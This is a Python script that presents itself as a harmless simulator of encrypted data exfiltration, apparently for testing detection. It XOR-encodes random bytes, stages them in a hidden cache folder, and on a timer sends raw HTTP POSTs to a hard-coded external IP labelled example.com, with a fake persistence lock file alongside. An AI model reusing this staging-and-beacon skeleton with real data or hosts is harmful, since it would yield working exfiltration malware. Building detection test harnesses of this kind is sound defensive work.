# unseen_level3_fake_encrypted_exfil.py
# Safe fake-encrypt + fake-exfil simulator
# "Data" is 100% random bytes — no real content ever captured.
# "Exfiltration" is a raw HTTP POST to example.com:80 with dummy base64 body.
# Simulates: encryption step, staging file, exfil attempt — behavioral pattern only.

import os
import time
import threading
import socket
import random
import base64
import string

STAGE_DIR = os.path.expanduser("~/.cache_test")
os.makedirs(STAGE_DIR, exist_ok=True)
LOCK_FILE = os.path.join(STAGE_DIR, ".exfil.lock")

running = True
exfil_count = 0
encrypt_count = 0

def dummy_xor_encrypt(data: bytes, key: int = 0x5A) -> bytes:
    """Fake XOR 'encryption' on random bytes — not real data."""
    return bytes(b ^ key for b in data)

def random_payload(size=64) -> bytes:
    """Generates purely random bytes — no real captured data."""
    return bytes(random.getrandbits(8) for _ in range(size))

def encrypt_and_stage():
    """Generates dummy payload, fake-encrypts, writes to staging file."""
    global encrypt_count
    payload = random_payload(random.randint(32, 96))
    encrypted = dummy_xor_encrypt(payload)
    encoded = base64.b64encode(encrypted).decode()
    stage_path = os.path.join(STAGE_DIR, f"stage_{encrypt_count % 5}.bin")
    with open(stage_path, "w") as f:
        f.write(encoded)
    encrypt_count += 1

def fake_exfil_thread():
    """Reads staging file and sends dummy HTTP POST to example.com:80."""
    global running, exfil_count
    while running:
        time.sleep(random.uniform(15, 25))
        # Read a staged dummy file
        stage_path = os.path.join(STAGE_DIR, f"stage_{exfil_count % 5}.bin")
        try:
            with open(stage_path, "r") as f:
                encoded = f.read()
        except Exception:
            encoded = base64.b64encode(b"fallback_dummy").decode()

        # Send dummy HTTP POST — no real data
        post_body = f"data={encoded[:32]}"
        http_request = (
            f"POST / HTTP/1.0\r\n"
            f"Host: example.com\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(post_body)}\r\n"
            f"Connection: close\r\n\r\n"
            f"{post_body}"
        ).encode()
        try:
            with socket.create_connection(("93.184.216.34", 80), timeout=5) as s:
                s.sendall(http_request)
                # Intentionally do not read response
            exfil_count += 1
            print(f"[exfil] Dummy POST sent (#{exfil_count})")
        except Exception as e:
            print(f"[exfil] Connection attempt failed: {e}")

def encrypt_loop():
    """Continuously generates and stages dummy encrypted chunks."""
    global running
    while running:
        encrypt_and_stage()
        time.sleep(3)

def persistence_check():
    """Fake persistence: checks/creates a .lock file."""
    global running
    while running:
        if not os.path.exists(LOCK_FILE):
            with open(LOCK_FILE, "w") as f:
                f.write(str(os.getpid()))
        time.sleep(10)

def reporter():
    while running:
        time.sleep(10)
        print(f"[reporter] Encrypt cycles: {encrypt_count} | Exfil attempts: {exfil_count}")

if __name__ == "__main__":
    print("[*] Starting safe fake-encrypt/exfil simulator...")
    threads = [
        threading.Thread(target=encrypt_loop, daemon=True),
        threading.Thread(target=fake_exfil_thread, daemon=True),
        threading.Thread(target=persistence_check, daemon=True),
        threading.Thread(target=reporter, daemon=True),
    ]
    for t in threads:
        t.start()
    try:
        time.sleep(120)
    except KeyboardInterrupt:
        pass
    finally:
        running = False
        if os.path.exists(LOCK_FILE):
            os.remove(LOCK_FILE)
        print("[*] Simulator stopped.")
